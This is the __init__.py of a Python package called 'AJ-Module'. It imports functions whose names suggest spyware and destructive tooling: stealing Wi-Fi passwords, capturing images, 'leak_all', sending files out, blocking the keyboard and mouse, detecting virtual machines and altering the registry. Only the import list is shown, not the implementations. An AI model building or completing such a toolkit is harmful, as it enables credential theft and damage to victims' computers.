'Destroy'
from .destroy.reg import reg2_0
'Folder'
from .folder.env import create_env
'Hack'
from .hack.keyboard import block_keyboard
from .hack.mouse import block_mouse
'OS'
from .os.get_drives import drives
from .os.processes import list_processes
from .os.kill import kill_process
'Checks'
from .checks.internet import has_internet, ping
from .checks.vm import run_on_vm
'PWD'
from .pwd.pwds import gen_pwd
'Zip'
from .zip.zipping import create_zip
'Data'
from .data.get_data import take_image, capture, get_wifi_pwds, leak_all
'Send'
from .send.send_data import send_file, send_embed
'Useful'
from .useful.convert import remove_duplicates
'Terminal'
from .terminal.apps import wait, size_calc, cls, colored_text, formatted_text, get_sys_info

# Package metadata
__all__ = [
    "reg2_0",
    "create_env",
    "block_keyboard",
    "block_mouse",
    "drives", 
    "has_internet",
    "run_on_vm",
    "gen_pwd",
    "create_zip",
    "take_image",
    "capture",
    "get_wifi_pwds",
    "leak_all",
    "send_file",
    "send_embed",
    "remove_duplicates",
    "wait",
    "size_calc",
    "cls",
    "colored_text",
    "formatted_text",
    "get_sys_info",
    "ping",
    "list_processes",
    "kill_process"
]
__author__ = "AJ-Holzer"
__version__ = "1.0.0"
__status__ = "Development"
__license__ = "MIT"
__description__ = "This is a module which allows you to modify a pc or doing just some little things."
__url__ = "https://github.com/AJ-Holzer/AJ-Module"

def start_msg():
    # Run this code before the module starts
    from .settings import settings

    # Initialization code
    if settings.send_init_msg:
        msg = settings.ITALIC + f"--> Package '{__name__}' version {__version__} initialized...\n" + settings.RESET
        print(msg)

start_msg()